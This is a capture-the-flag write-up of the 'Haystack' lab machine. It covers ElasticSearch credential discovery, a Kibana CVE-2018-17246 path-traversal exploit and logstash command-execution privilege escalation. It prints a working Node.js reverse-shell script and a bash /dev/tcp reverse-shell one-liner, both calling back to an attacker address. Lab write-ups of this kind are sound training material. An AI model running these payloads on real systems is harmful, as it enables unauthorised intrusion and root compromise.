##### Tags: `kibana`  `base64`  `ElasticSearch`  `CVE-2018-17246`  `cron job`

# 🐧Haystack🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 10.129.244.180
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    nginx 1.12.2
9200/tcp open  http    nginx 1.12.2
```
there is a photo call needle.jpg in port 80
```console
$ curl http://10.129.244.180                                                                                
<html>
<body>
<img src="needle.jpg" />
</body>
</html>
```
download and found the base64 strings
```console
$ strings needle.jpg
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```
decode and found the keyword clave
```console
$ echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
la aguja en el pajar es "clave"
```
Port 9200 is running ElasticSearch  
https://hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html  
there are three index
```console
$ curl http://10.129.244.178:9200/_cat/indices?v
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```
search each one using the key clave and found there are two output in quotes
```console
curl -s http://10.129.244.178:9200/quotes/_search?size=253 | jq | grep "clave"
          "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
          "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
```
decode and got security:spanish.is.key  
```console
$ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d           
user: security

$ echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d        
pass: spanish.is.key                                                                                                                                    
```
logged in as security
```console
$ ssh security@10.129.244.180

[security@haystack tmp]$ id
uid=1000(security) gid=1000(security) groups=1000(security)
```
## lateral movement

found port 5601 is running locally
```console
[security@haystack tmp]$ ss -anp | grep LISTEN        
tcp    LISTEN     0      128    127.0.0.1:5601                  *:*
```
do port forwarding on kali machine
```console
$ ssh -L 5602:127.0.0.1:5601 security@10.129.244.180
security@10.129.244.180's password: 
Last login: Mon Aug  3 08:51:40 2026 from haystack
```
access from the web 
```console
http://127.0.0.1:5602
```
found the kibana version is 6.4.2 CVE-2018-17246  
```console
https://github.com/mpgn/CVE-2018-17246
```
upload a reverse.js file to /tmp
```console
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.14.3", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
execute it via the webpage
```console
http://127.0.0.1:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/reverse.js
```
```console
$ penelope -p 1337
bash-4.2$ id
uid=994(kibana) gid=992(kibana) grupos=992(kibana)
```

## Privilege Escalation
upload linpeas found we can read file in logstash
```console
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r-----. 1 root kibana 109 jun 24  2019 /etc/logstash/conf.d/output.conf                                                         
-rw-r-----. 1 root kibana 186 jun 24  2019 /etc/logstash/conf.d/input.conf
-rw-r-----. 1 root kibana 131 jun 20  2019 /etc/logstash/conf.d/filter.conf
```
so the path is in /opt/kibana/logstash_* which we have write access to  
it will execute every 10 second  
format of the file is Ejecutar comando : 
```console
bash-4.2$ cat input.conf
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}


bash-4.2$ cat filter.conf
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}


bash-4.2$ cat output.conf
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```
create a revershell
```console
bash-4.2$ echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.3/443 0>&1" > /opt/kibana/logstash_root
```
after a while and we got the root shell
```console
$ penelope -p 443    
[root@haystack /]# id
uid=0(root) gid=0(root) grupos=0(root) 
```
